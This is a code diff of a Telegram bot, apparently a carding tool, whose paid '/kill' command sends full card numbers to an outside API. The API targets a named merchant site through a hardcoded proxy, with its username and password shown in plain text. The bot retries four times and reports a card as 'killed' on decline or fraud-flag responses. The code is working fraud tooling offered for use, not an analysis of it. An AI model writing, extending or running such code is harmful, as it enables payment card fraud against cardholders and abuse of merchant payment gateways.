@@ -2559,13 +2559,16 @@ from db import get_user, update_user
 import json
 
 # ---------------- CONFIG ----------------
-DEFAULT_KILL_SITE = "https://deltacloudz.com"
-KILL_PROXY = "107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-
-kill_site = DEFAULT_KILL_SITE  # Global site used in /kill
+KILL_API = (
+    "https://rockyog.onrender.com/index.php"
+    "?site=https://deltacloudz.com"
+    "&cc={full_card}"
+    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+)
 
 COOLDOWN = 5                 # per-user cooldown seconds
 ANIM_STEP_DELAY = 0.7        # animation speed (seconds per char)
+CHECK_TIMES = 4              # how many times to check the API
 user_cooldowns = {}          # user_id -> last timestamp
 
 DEVELOPER_NAME = "kคli liຖนxx"
@@ -2574,6 +2577,7 @@ developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
 # ---------------- credits ----------------
 async def consume_credit(user_id: int, amount: int = 5) -> bool:
+    """Deduct `amount` credits from user. Returns True on success."""
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) >= amount:
         new_credits = user_data["credits"] - amount
@@ -2581,7 +2585,7 @@ async def consume_credit(user_id: int, amount: int = 5) -> bool:
         return True
     return False
 
-# ---------------- /kill command ----------------
+# ---------------- command entry ----------------
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
@@ -2594,12 +2598,12 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
+    # set cooldown and schedule background task
     user_cooldowns[user_id] = now
     asyncio.create_task(_kill_task(update, context, user_id))
 
+# ---------------- background worker ----------------
 async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
-    global kill_site
-    anim_task = None
     try:
         start_time = time.time()
 
@@ -2634,7 +2638,13 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         # --- Unsupported card check ---
         if brand_upper in ("AMEX", "AMERICANEXPRESS", "AMERICAN_EXPRESS"):
             await update.message.reply_text(
-                "⚠️ 𝐀𝐦𝐞𝐫𝐢𝐜𝐚𝐧 𝐄𝐱𝐩𝐫𝐞𝐬𝘀 𝐝𝐞𝐭𝐞𝐜𝐭𝐞𝐝!\n❌ 𝙆𝙞𝙡𝙡 𝙤𝙣𝙡𝙮 𝙨𝙪𝙥𝙥𝙤𝙧𝙩𝙨 𝙑𝗂𝘀𝗮 𝙘𝙖𝙧𝙙𝙨.",
+                "⚠️ American Express detected!\n❌ /kill only supports VISA cards.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+        if brand_upper in ("MASTERCARD", "MASTER", "MASTER_CARD", "MASTERCARDDEBIT"):
+            await update.message.reply_text(
+                "⚠️ Mastercard detected!\n❌ /kill only supports VISA cards.",
                 parse_mode=ParseMode.HTML
             )
             return
@@ -2651,8 +2661,9 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         # --- Initial message ---
         try:
             msg = await update.message.reply_text(
-                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝗇𝗀 𝙄𝙣 𝙋𝗿𝗼𝙘𝗲𝙨𝙨⏳</code></pre>\n"
-                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {escape(kill_site)}",
+                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
+                "<pre><code></code></pre>\n"
+                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫",
                 parse_mode=ParseMode.HTML,
                 disable_web_page_preview=True
             )
@@ -2666,9 +2677,9 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         # --- Animation ---
         async def _animate_loop(message):
             anim_texts = [
-                "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝗈𝙣 𝙄𝙨 𝙋𝗿𝗼𝗰𝗲𝙨𝙨𝗂𝗻𝗀...",
-                "𝙋𝗹𝙚𝗮𝙨𝗲 𝙬𝗮𝗶𝙩 𝙛𝗈𝗋...",
-                "𝙖 𝙬𝗵𝗂𝗹𝗲..."
+                "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙤𝙣 𝙄𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜...",
+                "𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧...",
+                "𝙖 𝙬𝙝𝙞𝙡𝙚..."
             ]
             idx = 0
             try:
@@ -2677,9 +2688,9 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
                     for i in range(1, len(anim_text) + 1):
                         shown = anim_text[:i]
                         text = (
-                            "<pre><code>𝙆𝙞𝙡𝙡𝙞𝗇𝗀 𝙄𝙣 𝙋𝗿𝗼𝗰𝗲𝙨𝙨⏳</code></pre>\n"
+                            "<pre><code>𝙆𝙞𝙡𝙡𝙞𝙣𝙜 𝙄𝙣 𝙋𝙧𝙤𝙘𝙚𝙨𝙨⏳</code></pre>\n"
                             f"<pre><code>{escape(shown)}</code></pre>\n"
-                            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {escape(kill_site)}"
+                            "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫"
                         )
                         try:
                             await message.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -2692,24 +2703,38 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
 
         anim_task = asyncio.create_task(_animate_loop(msg))
 
-        # --- API call ---
-        KILL_API = f"https://rockyog.onrender.com/index.php?site={kill_site}&cc={cc}&proxy={KILL_PROXY}"
-        async with aiohttp.ClientSession() as session:
-            try:
-                async with session.get(KILL_API, timeout=55) as resp:
-                    try:
-                        data = await resp.json()
-                    except Exception:
-                        txt = await resp.text()
-                        try:
-                            data = json.loads(txt)
-                        except Exception:
-                            data = {"Response": txt}
-            except Exception:
-                data = {"Response": "FAILED / TIMEOUT"}
+        # --- Perform checks ---
+        api_url = KILL_API.format(full_card=cc)
+        final_status = "❌ FAILED / TIMEOUT"
+        display_response = "The card could not be killed."
 
-        response = (data.get("Response") or "").upper()
-        display_response = data.get("Message") or data.get("message") or response
+        async with aiohttp.ClientSession() as session:
+            for attempt in range(CHECK_TIMES):
+                try:
+                    async with session.get(api_url, timeout=55) as resp:
+                        try:
+                            data = await resp.json()
+                        except Exception:
+                            txt = await resp.text()
+                            try:
+                                data = json.loads(txt)
+                            except Exception:
+                                data = {"Response": txt}
+                except Exception:
+                    await asyncio.sleep(1)
+                    continue
+
+                response = (data.get("Response") or "").upper()
+
+                # ✅ Only CARD_DECLINED or FRAUD_SUSPECTED counts as killed
+                if response in ("CARD_DECLINED", "FRAUD_SUSPECTED"):
+                    final_status = "✅ 𝗞𝗶𝗹𝗹𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
+                    display_response = "Your card has been killed successfully."
+                else:
+                    final_status = "❌ FAILED"
+                    display_response = data.get("Message") or data.get("message") or "Gateway returned an unrecoverable response."
+
+                await asyncio.sleep(1)
 
         # --- Stop animation ---
         anim_task.cancel()
@@ -2718,7 +2743,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         except asyncio.CancelledError:
             pass
 
-        # --- Deduct 5 credits ---
+        # --- Deduct 5 credits once ---
         try:
             await consume_credit(user_id, 5)
         except Exception:
@@ -2726,9 +2751,9 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
 
         # --- Final message ---
         elapsed_time = round(time.time() - start_time, 1)
-        escaped_card = escape(cc[:6] + "******" + cc[-3:])
+        escaped_card = escape(cc[:6] + "******" + cc[-4:])
         final_text = (
-            f"<b><i>{response}</i></b>\n\n"
+            f"<b><i>{final_status}</i></b>\n\n"
             f"𝐂𝐚𝐫𝐝\n⤷ <code>{escaped_card}</code>\n"
             f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(display_response)}</code></i>\n\n"
             f"<pre>"
@@ -2746,11 +2771,10 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
             await update.message.reply_text(final_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
 
     except Exception as e:
-        if anim_task:
-            try:
-                anim_task.cancel()
-            except Exception:
-                pass
+        try:
+            anim_task.cancel()
+        except Exception:
+            pass
         try:
             await update.message.reply_text(
                 "❌ Unexpected error while processing /kill.",
@@ -2759,31 +2783,6 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         except Exception:
             pass
         print(f"[ERROR] /kill task failed: {e}")
-
-# ---------------- /changekillsite command ----------------
-async def changekillsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global kill_site
-    if not context.args:
-        await update.message.reply_text(
-            "❌ Please provide a new site.\nExample:\n<code>/changekillsite https://newsite.com</code>",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    new_site = context.args[0].strip()
-    if not new_site.startswith("http"):
-        await update.message.reply_text(
-            "❌ Invalid URL. Make sure it starts with http or https.",
-            parse_mode=ParseMode.HTML
-        )
-        return
-
-    kill_site = new_site
-    await update.message.reply_text(
-        f"✅ Kill site has been updated to:\n<code>{escape(kill_site)}</code>",
-        parse_mode=ParseMode.HTML
-    )
-
 
 
 
